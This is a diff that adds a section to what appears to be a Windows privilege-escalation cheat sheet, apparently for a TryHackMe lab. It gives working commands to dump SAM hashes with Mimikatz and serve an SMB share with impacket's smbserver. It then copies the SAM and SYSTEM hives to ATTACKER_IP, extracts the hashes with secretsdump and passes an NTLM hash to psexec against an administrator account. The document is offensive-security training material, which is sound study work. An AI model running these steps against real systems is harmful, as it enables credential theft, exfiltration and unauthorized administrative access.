@@ -620,6 +620,33 @@ If you have enough privilege, use Mimikatz to dump the hashes.
 mimikatz64.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"
 ```
 
+Send them to Kali.
+On Kali:
+
+```
+mkdir share
+smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
+```
+
+On Windows:
+
+```
+copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\
+copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\
+```
+
+Then, use secretsdump
+
+```
+secretsdump.py -sam sam.hive -system system.hive LOCAL
+```
+
+Then, do pass the hash
+
+```
+psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@10.113.185.188
+```
+
 ---
 
 # 29. Final Advice
